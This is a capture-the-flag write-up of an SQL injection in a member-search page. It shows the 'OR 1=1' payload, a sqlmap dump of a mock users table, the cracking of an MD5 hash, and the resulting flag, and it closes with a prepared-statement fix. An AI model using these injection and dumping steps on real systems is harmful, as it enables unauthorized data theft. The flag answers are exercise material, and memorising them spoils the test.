# Sql Injection Members
- In the page /?page=member there is a field to search members by their ids.
- That input gives us an SQL statement error "Unknown column 'Foo' in 'where clause'" in case of invalid input ie: Foo.

# Vulnerability
- We could imagine the SQL statement in back end is as follows:
```sql 
    SELECT * FROM users WHERE id = $_GET['id']
```
- We can enter some malicius input like this: 42 OR 1=1 this statment is always true so it will return ALL rows from the "users" table.
- Using 'sqlmap' to dump users data from users table returns this:
Database: Member_Sql_Injection
Table: users
[4 entries]
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                   | countersign                                    |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                      | 2b3366bcfd44f540e630d4dc2b9b06d9               |
| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                     | 60e9032c586fb422e2c16dee6286cf10 (oktoberfest) |
| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | ????? ????????????? ?????????                                                 | e083b24a01c483437bcf4a9eea7c1b4d               |
| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28               |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
- Notice the comment: Decrypt this password -> then lower all the char. Sh256 on it and it's good !         5ff9d0165b4f92b14994e5c685cdce28
- Converting 5ff9d0165b4f92b14994e5c685cdce28 to plain text is FortyTwo.
- Converting fortytwo to sha256 is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 Which is Our Flag.

# Fix
- We can prevent this by using prepared statements and parameterized queries.